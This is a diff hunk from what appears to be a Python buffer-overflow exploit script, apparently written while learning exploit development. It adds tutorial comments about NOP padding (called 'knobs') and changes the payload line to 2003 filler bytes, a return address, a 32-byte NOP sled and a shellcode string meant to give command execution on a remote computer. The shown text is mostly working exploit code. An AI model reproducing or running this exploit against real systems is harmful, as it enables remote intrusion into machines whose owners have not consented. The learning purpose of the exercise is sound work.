@@ -974,8 +974,17 @@ overflow = ("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
         # 4. But! before submit the `overflow` we need to add something else called `knobs` 
         
             # Knobs looks something like this: 
+            
+                # shellcode = "A" * 2003 + "\xAF\x11\x50\x62" + "\x90" * 32 + overflow
+            
+            # Knobs ("\x90" * 32) are padding essentially they stand for no operation, used just for add some "space" between this jump command in this overflow shellcode.
+            
+            # Without knobs, the overflow may not work adn maybe we can't get command execution on the other computer because something interfered here. 
+            # So, we just add a little bit of padding in between these two and that make it a little bit more safe.
+            
+        # NOTE: If you have limited space for the payload is very important to add padding maybe 8 bytes, or 16... you need to experiment with different values and figure out. 
 
-shellcode = "A" * 2003 + "\xAF\x11\x50\x62" + overflow 
+shellcode = "A" * 2003 + "\xAF\x11\x50\x62" + "\x90" * 32 + overflow 
 
 while True:
         try:
